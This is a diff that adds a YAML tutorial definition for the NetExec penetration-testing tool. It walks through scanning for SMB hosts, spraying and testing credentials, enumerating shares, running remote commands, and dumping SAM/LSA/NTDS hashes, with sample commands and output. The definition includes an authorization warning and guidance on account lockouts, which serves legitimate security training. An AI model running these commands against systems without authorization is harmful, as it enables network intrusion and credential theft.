@@ -1,0 +1,224 @@
+tool_id: netexec
+display_name: "NetExec (nxc)"
+binary_candidates: [netexec, nxc]
+categories: [exploitation, post_exploitation, password]
+os_profile: kali
+one_liner: "Tests credentials and executes commands across Windows/Active Directory networks — SMB, WinRM, SSH, MSSQL, RDP, and more."
+authorization_gate: true
+authorization_text: >
+  NetExec authenticates against every host you target, at scale, and its command-execution
+  and secret-dumping features have real impact on live systems: repeated bad logins can
+  trigger account lockouts across a whole domain, -x/-X actually run code on the target
+  (via a Windows service or scheduled task, which can trip AV/EDR and leaves artifacts), and
+  --sam/--lsa/--ntds dump real credential material — including, on a Domain Controller, the
+  ENTIRE domain's password database. Only run this against systems and accounts you own or
+  have explicit written authorization to test, and confirm the account-lockout policy before
+  spraying credentials. Continue?
+flows:
+  - flow_id: guided
+    title: "Guided first run — SMB (START HERE)"
+    goal: "From finding live hosts to a working credential, share access, and (if admin) code execution."
+    command_builder_id: netexec
+    slots: [PROGRAM, TARGET_PIVOT, ACTION_OPTIONS]
+    steps:
+      - step_id: g1
+        title: "Find hosts speaking SMB on your authorized network"
+        slot_target: TARGET_PIVOT
+        glossary_refs: [smb]
+        explanation:
+          what: "netexec needs a target — a single host, an IP range/CIDR, a hostname/FQDN, or a file listing many. Start by finding which hosts on your authorized network actually speak SMB (port 445)."
+          why: "There's no point authenticating against hosts that aren't even listening — a quick port sweep first saves time and noise."
+          where: "The target(s) come right after the protocol name (smb) in every netexec command."
+        find_it: "Use nmap against your authorized range to find hosts with port 445 open."
+        command_anatomy:
+          - {token: "nmap", does: "the port scanner (see the nmap tool)"}
+          - {token: "-p 445 --open", does: "only show hosts with port 445 open"}
+          - {token: "192.168.1.0/24", does: "your authorized network range — you type this in"}
+        try_this: "nmap -p 445 --open 192.168.1.0/24"
+        success_criteria: "A list of hosts with 445/tcp open — these are your netexec targets."
+        expected_output: |
+          Nmap scan report for 192.168.1.10
+          PORT    STATE SERVICE
+          445/tcp open  microsoft-ds
+        alternatives:
+          - trigger: "nothing has 445 open"
+            cause: "Wrong network, or SMB is firewalled off."
+            fix: "Confirm you're on the authorized segment (`ip a`); some networks block 445 between subnets."
+            check: "At least one host answers on 445."
+      - step_id: g2
+        title: "Fingerprint hosts with no credentials yet"
+        slot_target: null
+        explanation:
+          what: "Running netexec's smb module with NO -u/-p at all still fingerprints every target: hostname, OS build, domain name, and whether SMB signing is enforced — all without needing a single valid credential."
+          why: "This confirms netexec can actually talk to the host, and the domain name it reports is exactly what you'll need for -d in the next step."
+          where: "Just the protocol + target(s); no Authentication-section flags yet."
+        find_it: "Use a target (or range) from step 1."
+        command_anatomy:
+          - {token: "netexec", does: "the program"}
+          - {token: "smb", does: "protocol module — SMB, the most common for AD testing"}
+          - {token: "192.168.1.10", does: "the target — you type this in"}
+        try_this: "netexec smb 192.168.1.10"
+        success_criteria: "One line per host: OS build, hostname, domain, and SMB signing status print."
+        expected_output: |
+          SMB   192.168.1.10  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)
+        alternatives:
+          - trigger: "connection refused / times out"
+            cause: "Host isn't actually up, or SMB is firewalled from your position."
+            fix: "Re-confirm with the nmap sweep (step 1); some hosts only allow SMB from specific subnets."
+            check: "netexec prints a line for the host instead of erroring."
+      - step_id: g3
+        title: "Test a credential"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [password_spray]
+        explanation:
+          what: "`-u <user> -p <pass>` (add `-d <domain>` for a domain account, or `--local-auth` for a local one) tries that credential against every target. A green `[+]` means it authenticated."
+          why: "This is the core check netexec exists for: does this credential work here, and — if it does — is it a local admin?"
+          where: "ACTION_OPTIONS; -u/-p/-d all render after the target."
+        find_it: >
+          Use the domain name from step 2's fingerprint output for -d. Only test credentials
+          you're authorized to test, and know the account-lockout threshold before trying more
+          than one password per user.
+        command_anatomy:
+          - {token: "netexec smb 192.168.1.10", does: "same target as step 2"}
+          - {token: "-u jdoe", does: "the username — you type this in"}
+          - {token: "-p 'Password123'", does: "the password — you type this in"}
+          - {token: "-d CORP.LOCAL", does: "the domain from step 2's fingerprint — omit for a local account"}
+        try_this: "netexec smb 192.168.1.10 -u jdoe -p 'Password123' -d CORP.LOCAL"
+        success_criteria: "A green [+] line means the credential is valid; add (Pwn3d!) means it's also local admin."
+        expected_output: |
+          SMB   192.168.1.10  445  DC01  [+] CORP.LOCAL\jdoe:Password123
+        alternatives:
+          - trigger: "[-] STATUS_LOGON_FAILURE"
+            cause: "Wrong password, wrong domain, or the account is locked/disabled."
+            fix: "Double-check the domain from step 2; confirm the account isn't already locked before retrying."
+            check: "A [+] line appears instead."
+          - trigger: "worried about lockouts testing many accounts"
+            cause: "One password against many usernames is a password SPRAY, not a brute force — but it still counts toward lockout thresholds."
+            fix: "Pass a file of usernames to -u and keep to one or two passwords; confirm the domain's lockout policy first."
+            check: "—"
+      - step_id: g4
+        title: "Enumerate shares with that credential"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "`--shares` lists every SMB share on the target and whether your credential can READ and/or WRITE to each one."
+          why: "Shares are a common source of sensitive files, and a WRITE-able share is often a path to code execution (drop a file an admin will run)."
+          where: "ACTION_OPTIONS, alongside the same -u/-p/-d from step 3."
+        find_it: "Reuse the working credential from step 3."
+        command_anatomy:
+          - {token: "netexec smb 192.168.1.10 -u jdoe -p 'Password123' -d CORP.LOCAL", does: "same working credential as step 3"}
+          - {token: "--shares", does: "list shares and your access to each"}
+        try_this: "netexec smb 192.168.1.10 -u jdoe -p 'Password123' -d CORP.LOCAL --shares"
+        success_criteria: "A table of share names with READ/WRITE access prints."
+        expected_output: |
+          SMB   192.168.1.10  445  DC01  [*] Enumerated shares
+          SMB   192.168.1.10  445  DC01  Share      Permissions  Remark
+          SMB   192.168.1.10  445  DC01  -----      -----------  ------
+          SMB   192.168.1.10  445  DC01  C$         READ,WRITE   Default share
+          SMB   192.168.1.10  445  DC01  NETLOGON   READ         Logon server share
+        alternatives:
+          - trigger: "shares list but every access column is empty"
+            cause: "The credential is valid but has no access to enumerate permissions on those shares."
+            fix: "That's expected for a low-privilege account — note which shares exist for later, and try a different credential if you have one."
+            check: "—"
+      - step_id: g5
+        title: "Run a command, if you're local admin"
+        slot_target: ACTION_OPTIONS
+        destructive: true
+        recovery: >
+          The command runs via a temporary Windows service/scheduled task that netexec creates
+          and removes automatically — there's nothing to manually clean up on success, but a
+          crashed run can occasionally leave one behind; check Services/Task Scheduler on the
+          target if that's a concern.
+        glossary_refs: [pwn3d]
+        explanation:
+          what: "If step 3 showed (Pwn3d!), `-x <command>` executes that CMD command on the target and prints its output — this is the 'execution' netexec is named for."
+          why: "This is real code execution on a real machine, not a simulation — treat it exactly like you would running a command on that box directly."
+          where: "ACTION_OPTIONS, alongside the same credential."
+        find_it: "Only proceed if step 3 showed (Pwn3d!) for this credential on this host. Start with something harmless like whoami."
+        command_anatomy:
+          - {token: "netexec smb 192.168.1.10 -u jdoe -p 'Password123' -d CORP.LOCAL", does: "same admin credential as step 3"}
+          - {token: "-x whoami", does: "the CMD command to run remotely — you choose this"}
+        try_this: "netexec smb 192.168.1.10 -u jdoe -p 'Password123' -d CORP.LOCAL -x whoami"
+        success_criteria: "The command's output prints, prefixed by the host."
+        expected_output: |
+          SMB   192.168.1.10  445  DC01  [+] CORP.LOCAL\jdoe:Password123 (Pwn3d!)
+          SMB   192.168.1.10  445  DC01  [+] Executed command
+          SMB   192.168.1.10  445  DC01  corp\jdoe
+        alternatives:
+          - trigger: "STATUS_ACCESS_DENIED on execution"
+            cause: "The credential doesn't actually have local admin rights (no Pwn3d! in step 3)."
+            fix: "Re-check step 3's output; execution only works for admin-equivalent credentials."
+            check: "Pwn3d! appears for this exact credential/host combination."
+  - flow_id: dump
+    title: "Dump credential material (reference)"
+    goal: "Pull SAM/LSA/NTDS secrets from an admin-accessible host."
+    command_builder_id: netexec
+    slots: [PROGRAM, TARGET_PIVOT, ACTION_OPTIONS]
+    steps:
+      - step_id: d1
+        title: "--sam / --lsa / --ntds"
+        slot_target: ACTION_OPTIONS
+        destructive: true
+        recovery: "No target-side changes are made — this only reads secrets, nothing to undo. Handle the dumped credentials as sensitive data (secure storage, don't leave on disk unencrypted)."
+        glossary_refs: [sam_lsa_ntds]
+        explanation:
+          what: "With an admin credential, `--sam` dumps local account hashes, `--lsa` dumps cached secrets, and `--ntds` dumps the WHOLE domain's password database (Domain Controller only)."
+          why: "This is the real payoff of local admin / DC access — SAM/LSA hashes crack offline (hashcat -m 1000 for SAM NTLM), and NTDS.dit is domain-wide compromise."
+          where: "ACTION_OPTIONS, alongside the same -u/-p/-d as any other run."
+        find_it: "Requires an admin credential (Pwn3d! from the guided flow). --ntds only works against a Domain Controller."
+        command_anatomy:
+          - {token: "netexec smb 192.168.1.10 -u jdoe -p 'Password123' -d CORP.LOCAL", does: "same admin credential"}
+          - {token: "--sam", does: "dump local SAM account hashes"}
+        try_this: "netexec smb 192.168.1.10 -u jdoe -p 'Password123' -d CORP.LOCAL --sam"
+        success_criteria: "Username:RID:LMHash:NTHash lines print for local accounts."
+        expected_output: |
+          SMB   192.168.1.10  445  DC01  [+] Dumping SAM hashes
+          SMB   192.168.1.10  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        alternatives:
+          - trigger: "STATUS_ACCESS_DENIED"
+            cause: "Credential isn't actually local admin on this host."
+            fix: "Re-confirm Pwn3d! for this exact credential/host in the guided flow first."
+            check: "--sam only works with a genuinely admin-equivalent credential."
+quick_build:
+  builder: netexec
+  title: "Quick run"
+  fields:
+    - field_id: protocol
+      label: "Protocol"
+      type: choice
+      choices: ["smb", "ssh", "winrm", "rdp", "mssql", "ftp", "nfs", "ldap", "vnc", "wmi"]
+      default: "smb"
+    - field_id: target
+      label: "Target (IP/CIDR/hostname/file)"
+      type: string
+      required: true
+      placeholder: "192.168.1.10"
+    - field_id: username
+      label: "Username (-u)"
+      type: string
+      placeholder: "jdoe"
+    - field_id: password
+      label: "Password (-p)"
+      type: string
+      placeholder: "Password123"
+    - field_id: hash
+      label: "NTLM hash instead of password (-H)"
+      type: string
+      placeholder: "aad3b435...:31d6cfe0... (optional)"
+    - field_id: domain
+      label: "Domain (-d)"
+      type: string
+      placeholder: "CORP.LOCAL  (optional)"
+    - field_id: local_auth
+      label: "Local account, not domain (--local-auth)"
+      type: bool
+    - field_id: shares
+      label: "Enumerate shares (--shares)"
+      type: bool
+    - field_id: sam
+      label: "Dump SAM hashes (--sam)"
+      type: bool
+    - field_id: exec_command
+      label: "Run a CMD command if admin (-x)"
+      type: string
+      placeholder: "whoami  (optional)"
